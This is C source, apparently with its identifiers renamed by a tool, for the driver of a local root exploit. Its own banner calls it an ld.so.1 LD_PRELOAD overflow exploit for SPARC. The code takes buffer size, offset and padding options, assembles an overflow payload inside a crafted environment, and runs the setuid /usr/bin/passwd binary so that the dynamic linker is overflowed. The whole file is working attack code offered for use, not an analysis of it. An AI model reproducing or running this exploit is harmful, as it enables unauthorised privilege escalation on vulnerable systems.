
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int VAR_1 ;
 long VAR_2 ;
 int VAR_3 ;
 char* VAR_4 ;
 int FUNC_0 (int ) ;
 long FUNC_1 (int ) ;
 int FUNC_2 (char*,char**,char**) ;
 int FUNC_3 (int ) ;
 char* FUNC_4 (char) ;
 char* FUNC_5 (long) ;
 char* FUNC_6 (int,long) ;
 char FUNC_7 (int,char**,char*) ;
 scalar_t__ FUNC_8 (int) ;
 int FUNC_9 (char*,float,int) ;
 int VAR_5 ;
 scalar_t__ VAR_6 ;
 int FUNC_10 (char*) ;
 int FUNC_11 (char*,...) ;

int FUNC_12(int VAR_7, char **VAR_8)
{

  char *VAR_9[3];
  char *VAR_10[7];
  char VAR_11;
  int VAR_12 = -1;
  int VAR_13 = -1;
  long VAR_14 = -1;

  char *VAR_15 = 0x0;
  char *VAR_16 = 0x0;



  char *VAR_17 = 0x0;
  char *VAR_18 = 0x0;
  char *VAR_19 = 0x0;




  while((VAR_11 = FUNC_7(VAR_7, VAR_8, "s:o:p:")) != -1)
  {
    switch(VAR_11) {
    case 's':
      if(!VAR_5) {
 FUNC_11("-s needs size argument\n");
 FUNC_3(0);
      }
      else
 VAR_12 = FUNC_0(VAR_5);
      break;

    case 'o':
      if(!VAR_5) {
 FUNC_11("-o needs offset argument\n");
 FUNC_3(0);
      }
      else
 VAR_14 = FUNC_1(VAR_5);
      break;

    case 'p':
      if(!VAR_5) {
 FUNC_11("-p needs pad length argument\n");
 FUNC_3(0);
      }
      else {
 VAR_13 = FUNC_0(VAR_5);
 if(VAR_13 < 0)
   VAR_13 = 0;
      }
      break;

    default:
      FUNC_11("Usage: %s [-s size] [-o offset] [-p fpad_len]\n", VAR_8[0]);
      FUNC_3(0);

    }

    VAR_7 -= VAR_6;
    VAR_8 += VAR_6;
  }

  FUNC_11("\n#######################################\n");
  FUNC_11("# ld.so.1 LD_PRELOAD (SPARC) exploit  #\n");
  FUNC_11("# coded by: osker178 (bjr213@psu.edu) #\n");
    FUNC_11("#######################################\n\n");

  if(VAR_12 == -1)
  {
    FUNC_11("Using default/recommended buffer size of %d\n", VAR_3);
    VAR_12 = VAR_3;
  }
  else if(VAR_12 % 4)
  {
    VAR_12 = VAR_12 + (4 - (VAR_12%4));
    FUNC_11("WARNING: Rounding BUF_SIZE up to 0x%x (%d)\n", VAR_12, VAR_12);
  }


  if(VAR_14 == -1)
  {
    FUNC_11("Using default OFFSET of 0x%x (%d)\n", VAR_1, VAR_1);
    VAR_14 = VAR_1;
  }
  else if((VAR_2 + VAR_14) % 8)
  {
    VAR_14 = VAR_14 + (8 - (VAR_14%8));
    FUNC_11("WARNING: Rounding offset up to 0x%x (%d)\n", VAR_14, VAR_14);
    FUNC_11("(otherwise FRAME_ADDR would not be alligned correctly)\n");
  }


  if(VAR_13 == -1)
  {
    FUNC_11("Using default FPAD_LEN of 0x%x (%d)\n", VAR_0, VAR_0);
    VAR_13 = VAR_0;
  }




  VAR_15 = FUNC_6(VAR_12, VAR_14);
  if(!VAR_15)
    FUNC_3(0);

  VAR_16 = FUNC_5(VAR_14);
  if(!VAR_16)
    FUNC_3(0);

  VAR_17 = FUNC_4('1');
  if(!VAR_17)
    FUNC_3(0);

  VAR_18 = FUNC_4('2');
  if(!VAR_18)
    FUNC_3(0);






  VAR_19 = (char *)FUNC_8(VAR_13+1);
  if(!VAR_19)
  {
    FUNC_10("malloc");
    FUNC_3(0);
  }
  FUNC_9(VAR_19, 'F', VAR_13);
  VAR_19[VAR_13] = '\0';


  VAR_10[0] = VAR_19;
  VAR_10[1] = VAR_16;
  VAR_10[2] = VAR_17;
  VAR_10[3] = VAR_4;
  VAR_10[4] = VAR_18;
  VAR_10[5] = VAR_15;
  VAR_10[6] = ((void*)0);

  VAR_9[0] = "/usr/bin/passwd";
  VAR_9[1] = "passwd";
  VAR_9[2] = ((void*)0);

  FUNC_2(VAR_9[0], VAR_9, VAR_10);

  FUNC_10("execve");

  return 0;
}
